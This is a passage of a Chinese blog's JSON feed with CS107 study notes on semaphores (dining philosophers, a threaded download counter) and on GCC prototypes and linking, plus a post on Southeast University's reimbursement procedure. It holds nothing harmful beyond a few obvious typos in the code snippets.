class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>forks<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>forks<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>id<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">Eat</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>forks<span class=\"token punctuation\">[</span>id<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>forks<span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span>id<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">%</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>numAllowedToEat<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token function\">Think</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>但是与其写 2，不如写 4，写 4 是可以的，因为只要有一个人不被允许拿叉子，那么其他人总有 1 个可以拿齐叉子并进行吃饭，尽管可能会有另几个人暂时被阻塞了。</p>\n<p>填 2 和 4 的区别在于，如果填的是 2，那么会有多个线程过早的钝化掉，被阻塞在 numAllowedToEat 这里；而 4 就是尽可能多的线程进行运行。</p>\n<p><strong>问题</strong>：为什么要使用 Semaphore，不用一个 int 来解决？</p>\n<p><strong>答</strong>： 使用信号量 Semaphore 是将这个监督过程交由线程管理器管理了。如果采用比如说循环的形式不断的人工去检查一个整数是否大于 0 或小于 0，那么你就无法做任何有意义的事，除非跳出这个循环，可能在一段时间里，你为了确认这个锁是不是 0 而不断重复获取并释放该锁，这种现象被称为 “忙等待”。当你有许多处理器的时候，你可以将线程运行在其他处理器上，并采取 “忙等待” 的方式进行检查，如果只有一个处理器，这样就是无意义的，会浪费大量处理器的时间 。</p>\n<h2 id=\"例子一\"><a class=\"markdownIt-Anchor\" href=\"#例子一\">#</a> 例子一</h2>\n<p><strong>FTP 下载</strong>，一个 1990 年的技术。现在假设我们有一个函数，这个函数叫 <code>DownloadSingleFile</code> 。这里的返回值就是我们要下载文件的字节数量。</p>\n<p>现在我想要实现一个下载所有文件的函数 <code>DownloadAllFiles</code> ，这里的 n 意味着 n 个线程，每一个线程用于下载一个文件。每一个线程都有一个存储下载文件字节数的大小的变量，并且我想要把这个变量的地址存储，并对它上锁，防止多个线程同时对其值进行修改。</p>\n<p>为什么在 <code>ThreadNew</code>  中不直接调用 <code>DownloadSingleFile</code>  呢？因为传递到 <code>ThreadNew</code>  的函数，返回值类型为 <code>void</code> ，即使返回值不为 <code>void</code> ，也没有办法抓取到来自 <code>ThreadNew</code>  环境下的返回值。所以我们通过另一个函数 <code>DownloadHelper</code>  帮助我们获取下载文件的字节数，并通过累加将值加到 <code>totalBytes</code>  中。</p>\n<p>下面来构建 <code>DownloadHelper</code> ，记住 Semaphore 本身就是指针，不需要加取址符，直接传入 lock 即可。这里直接赋值 <code>bytesDownloaded</code>  的含义是多个线程可以 “同时” 都在进行下载操作，后面线程对唯一的下载总字节数进行操作时才需要对其上锁。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">DownloadSingleFile</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> server<span class=\"token punctuation\">,</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">DownloadAllFiles</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> server<span class=\"token punctuation\">,</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> files<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">int</span> totalBytes <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Semaphore lock <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>n<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token function\">ThreadNew</span><span class=\"token punctuation\">(</span>ThreadName<span class=\"token punctuation\">,</span>DownloadHelper<span class=\"token punctuation\">,</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span>server<span class=\"token punctuation\">,</span>files<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>totalBytes<span class=\"token punctuation\">,</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> totalBytes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">DownloadHelper</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> server<span class=\"token punctuation\">,</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> path<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>numBytesp<span class=\"token punctuation\">,</span>Semaphore lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">int</span> bytesDownloaded <span class=\"token operator\">=</span> <span class=\"token function\">DownloadSingleFile</span><span class=\"token punctuation\">(</span>server<span class=\"token punctuation\">,</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>numBytes<span class=\"token punctuation\">)</span><span class=\"token operator\">+=</span>bytesDownloaded<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>但是这样编程有一点小问题，就是有可能我最后得到的返回值 <code>totalBytes</code>  是 0，为什么呢？因为从 for 循环的最后一跳到 return 假如很快，而在这个时间段内，所有线程中的写入操作还没有完成，那么这个时候就直接结束了 for 循环，导致最终得到的 <code>totalBytes</code>  不是一个准确的值。所以其实真正的工作量在这里，for 循环之前，我们需要阻塞住这个父进程，不能让他提前跳转到 <code>return</code>  语句。</p>\n<p>我们定义一个 <code>childrenDone</code>  信号量作为纽带。并让子线程结束后就 + 1。当然也可以初始化信号量为负值，但那是 JAVA 才有的内容，C 不行。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">DownloadAllFiles</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> server<span class=\"token punctuation\">,</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> files<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    Semaphore childrenDone <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">int</span> totalBytes <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Semaphore lock <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>n<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token function\">ThreadNew</span><span class=\"token punctuation\">(</span>ThreadName<span class=\"token punctuation\">,</span>DownloadHelper<span class=\"token punctuation\">,</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>server<span class=\"token punctuation\">,</span>files<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&amp;</span>totalBytes<span class=\"token punctuation\">,</span>lock<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>               ChildrenDone<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>i<span class=\"token operator\">&lt;</span>n<span class=\"token punctuation\">;</span>i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>childrenDone<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> totalBytes<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token keyword\">void</span> <span class=\"token function\">DownloadHelper</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> server<span class=\"token punctuation\">,</span><span class=\"token keyword\">const</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span> path<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> <span class=\"token operator\">*</span>numBytesp<span class=\"token punctuation\">,</span>Semaphore lock<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>                    Semaphore ParentToSignal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">int</span> bytesDownloaded <span class=\"token operator\">=</span> <span class=\"token function\">DownloadSingleFile</span><span class=\"token punctuation\">(</span>server<span class=\"token punctuation\">,</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token function\">SemaphoreWait</span><span class=\"token punctuation\">(</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>numBytes<span class=\"token punctuation\">)</span><span class=\"token operator\">+=</span>bytesDownloaded<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>lock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>   \t<span class=\"token function\">SemaphoreSignal</span><span class=\"token punctuation\">(</span>ParentToSignal<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>** 想法：** 如果 totalBytes 不使用 int 类型，而使用数组，那么进程在写入时就不会产生冲突，可以减少一个信号量。这是一个很好的想法，但如果 N 很大的时候，这个想法就不是很适用了，当 N 较小时这个方法很好。</p>\n<h2 id=\"为下一节课留的大例子\"><a class=\"markdownIt-Anchor\" href=\"#为下一节课留的大例子\">#</a> 为下一节课留的大例子</h2>\n<h3 id=\"ice-cream-store-simulation\"><a class=\"markdownIt-Anchor\" href=\"#ice-cream-store-simulation\">#</a> Ice Cream Store Simulation</h3>\n<p>在冰淇淋店，我们有 10 个顾客，我们还知道每个顾客定了几个冰淇淋 (1~4)，并且店里有一个收银员，每一个顾客都会走过去向他付钱，因此会产生小小的竞争。还有有个小经理决定做不做冰淇淋。10 到 40 个店员 ，店员可以同时做冰淇淋。顾客向店员订冰淇淋。店员还要和经理交互，并且一次只能一个人去见经理，经理会批准是否出售该冰淇淋。</p>\n<p>一共有四种不同的线程。我需要：</p>\n<p>经理一直呆在办公室中批准冰淇淋，直到批准售出的冰淇淋数量达标。</p>\n<p>每个店员，都能制作出好吃的冰淇淋并交给顾客。</p>\n<p>每个顾客，都能订到他们想要的冰淇淋，付完钱，离开商店。</p>\n<p>收银员，知道他要应对 10 个不同的顾客。</p>\n<p><img data-src=\"2023-12-01-%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_17/image-20231219170836381.png\" alt=\"image-20231219170836381\"></p>\n",
            "tags": [
                "斯坦福编程范式CS107"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/12/07/%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%8A%A5%E9%94%80%E6%B5%81%E7%A8%8B/",
            "url": "http://yanagi-kon.github.io/2023/12/07/%E4%B8%9C%E5%8D%97%E5%A4%A7%E5%AD%A6%E6%8A%A5%E9%94%80%E6%B5%81%E7%A8%8B/",
            "title": "东南大学报销流程",
            "date_published": "2023-12-07T00:28:00.000Z",
            "content_html": "<h1 id=\"东南大学报销流程\"><a class=\"markdownIt-Anchor\" href=\"#东南大学报销流程\">#</a> 东南大学报销流程</h1>\n<h2 id=\"1-非固定资产报销本部分以鼠标键盘为例\"><a class=\"markdownIt-Anchor\" href=\"#1-非固定资产报销本部分以鼠标键盘为例\">#</a> 1. 非固定资产报销（本部分以鼠标键盘为例）</h2>\n<h3 id=\"1首先登录东南大学网上办事服务大厅\"><a class=\"markdownIt-Anchor\" href=\"#1首先登录东南大学网上办事服务大厅\">#</a> 1. 首先登录<span class=\"exturl\" data-url=\"aHR0cDovL2VoYWxsLnNldS5lZHUuY24vbmV3L2luZGV4Lmh0bWw=\">东南大学网上办事服务大厅</span></h3>\n<p><img data-src=\"image-20231207092337368.png\" alt=\"image-20231207092337368\"></p>\n<h3 id=\"2-选则财务门户并进入\"><a class=\"markdownIt-Anchor\" href=\"#2-选则财务门户并进入\">#</a> 2. 选则财务门户并进入</h3>\n<p><img data-src=\"image-20231207092427819.png\" alt=\"image-20231207092427819\"></p>\n<h3 id=\"3-单机网上预约报销\"><a class=\"markdownIt-Anchor\" href=\"#3-单机网上预约报销\">#</a> 3. 单机网上预约报销</h3>\n<p><img data-src=\"image-20231207092524982.png\" alt=\"image-20231207092524982\"></p>\n<h3 id=\"4-电子发票认证\"><a class=\"markdownIt-Anchor\" href=\"#4-电子发票认证\">#</a> 4. 电子发票认证</h3>\n<p>推荐使用小程序进行认证，很方便</p>\n<p><img data-src=\"image-20231207092726902.png\" alt=\"image-20231207092726902\"></p>\n<h3 id=\"5-申请预约报销\"><a class=\"markdownIt-Anchor\" href=\"#5-申请预约报销\">#</a> 5. 申请预约报销</h3>\n<p>这部分是单价不超过 1000 的设备可以直接进行申请预约报销，否则需要进行固定资产认证。目前这套流程还没走过。</p>\n<p><img data-src=\"image-20231207092914298.png\" alt=\"image-20231207092914298\"></p>\n<p>填写报销单如下所示。</p>\n<p>其中报销项目号和项目负责人是对应的，附件张数和选择已认证发票的数量是一样的。摘要部分填写采购的什么内容。支付方式<strong>一般</strong>选择校内人员转卡。填写完成后点击下一步。</p>\n<p><img data-src=\"image-20231207093009308.png\" alt=\"image-20231207093009308\"></p>\n<p>进入如下页面后，根据报销物品的类别进行选择。比如我要报销的是键盘和鼠标，那么这里我就选择 <strong>计算控制类配件组件</strong> 并在框中填写准确的金额。完成后单击下一步。</p>\n<p><img data-src=\"image-20231207093232669.png\" alt=\"image-20231207093232669\"></p>\n<p>随后填写以下信息，填写完金额后，记得点击左下角的确认，才会进行更新，才能进行下一步。完成后单击下一步。</p>\n<p><img data-src=\"image-20231207093358358.png\" alt=\"image-20231207093358358\"></p>\n<p>随后进行时间预约咯，就是选择你要去交预约报销表的时间。</p>\n<p><img data-src=\"image-20231207093530271.png\" alt=\"image-20231207093530271\"></p>\n<p>预约完成后便可进行 <strong>预约报销单</strong> 的打印，打印下来交给项目负责人签字即可。签完字后还需要进行部门盖章，即你是哪个院的就找对应的院老师盖章。计算机院是计算机楼 126 李双老师。经办人填写自己的名字。</p>\n<h3 id=\"6-到时间去财务处交材料\"><a class=\"markdownIt-Anchor\" href=\"#6-到时间去财务处交材料\">#</a> 6. 到时间去财务处交材料</h3>\n<p>以上内容完成后到时间去财务处交材料。包括，预约报销单、对应的打印的发票、其他材料。</p>\n<p>** 注：** 目前 69 开头的项目申请 计算控制类配件组件报销 时需要额外一张表，去搜索东南大学财务处，在页面的下载专区进行下载填写完，也要项目负责人签字。</p>\n<p><img data-src=\"image-20231207093935204.png\" alt=\"image-20231207093935204\"></p>\n",
            "tags": [
                "test"
            ]
        },
        {
            "id": "http://yanagi-kon.github.io/2023/12/01/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_13/",
            "url": "http://yanagi-kon.github.io/2023/12/01/%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_13/",
            "title": "斯坦福编程范式CS107_13",
            "date_published": "2023-12-01T00:28:00.000Z",
            "content_html": "<h1 id=\"斯坦福编程范式cs107_13\"><a class=\"markdownIt-Anchor\" href=\"#斯坦福编程范式cs107_13\">#</a> 斯坦福编程范式 CS107_13</h1>\n<h2 id=\"使用gcc解释器的例子\"><a class=\"markdownIt-Anchor\" href=\"#使用gcc解释器的例子\">#</a> 使用 GCC 解释器的例子</h2>\n<p>main.c 文件</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token expression\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">assert</span> <span class=\"token expression\"><span class=\"token operator\">&lt;</span>assert<span class=\"token punctuation\">.</span>h<span class=\"token operator\">></span></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>mem <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span>mem <span class=\"token operator\">!=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">peintf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Yay! \\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>mem<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>上述 main 函数在 gcc 编译器后，生成 main.o 文件，然后进一步链接生成可执行文件。</p>\n<p>main.o 文件</p>\n<pre><code class=\"language-assembly\">SP = SP - 4\nCALL &lt;malloc&gt;\n...\nCALL &lt;printf&gt;\n...\nCALL &lt;free&gt;\nRV = 0\nSP = SP + 4\nRET\n</code></pre>\n<p>如果我们把主函数中 第二行的 #include 注释掉，那么大多数编译器就会不知道 printf 函数的意义从而报错。但 GCC 编译器不会，GCC 会根据函数的调用方式尝试去匹配它的原型。GCC 看到 printf 里面只有一个字符串作为参数，它会发出一个警告，说没有找到 printf 函数的原型，但是它不会停下来，继续生成 .o 文件。解释器会去标准库中去寻找这些代码，而 printf malloc free 这些函数正是在标准库中。</p>\n<p>如果把第三个 #assert 注释掉的话，编译器会猜测 assert 是一个函数，而不是一个宏定义，从而生成 .o 文件，而在链接阶段就会失败，因为 assert 不在标准库中，它不是一个函数。</p>\n<h2 id=\"另一个经典例子\"><a class=\"markdownIt-Anchor\" href=\"#另一个经典例子\">#</a> 另一个经典例子</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">int</span> num <span class=\"token operator\">=</span> <span class=\"token number\">65</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">int</span> length <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>num<span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Length = %d\\n\"</span><span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>我们没有声明 strlen 的函数原型，gcc 编译器会忽略继续编码，并在链接阶段去标准库中去链接同名的函数，虽然同名的函数只有 1 个参数，但是链接过程不会去管参数个数，而只会去查看参数类型。因为 strlen 只有一个函数参数，strlen 从 65 下方开始进行处理，即 (char *)&amp;num，符合函数 strlen 函数的参数类型，因此可以继续进行链接运行，strlen 函数不会使用 65 变量。</p>\n<p><img data-src=\"%E6%96%AF%E5%9D%A6%E7%A6%8F%E7%BC%96%E7%A8%8B%E8%8C%83%E5%BC%8FCS107_13/image-20231130145427916.png\" alt=\"image-20231130145427916\"></p>\n<p>这样子写会在编译过程中产生警告，如果想要不产生这样的警告，我们可以手动定义一个原型。这种写法相较于写 #include 来说，include 是包涵所有的 .h 文件，是很大很大的，这对编译很不利，可以手动添加原型来实现要求，而不需要添加 include 文件。当然这样也有风险，如果写错的话，那么编译出来的东西并不是你想要的代码。</p>\n<p>那么这样的代码输出的 Length 是多少？答案是 0 或 1。如果是大端存储，那么 int 的 4 字节对应的 char 就是：0 0 0 ‘A’，那么 strlen 就认为这个字符串以 0 开头，那么它就是一个空的字符串，所以返回 0。如果是小端存储，那么 4 字节就是 ‘A’ 0 0 0，那么就是字符串长度就是 1。</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>s<span class=\"token punctuation\">,</span><span class=\"token keyword\">int</span> len<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">int</span> num <span class=\"token operator\">=</span> <span class=\"token number\">65</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">int</span> length <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>num<span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Length = %d\\n\"</span><span class=\"token punctuation\">,</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><h2 id=\"经典例子相反的例子\"><a class=\"markdownIt-Anchor\" href=\"#经典例子相反的例子\">#</a> 经典例子相反的例子</h2>\n<p>一个原先要传递三个参数的函数，如果我声明原型并只传入一个参数会怎么样？</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> <span class=\"token function\">memcmp</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>v1<span 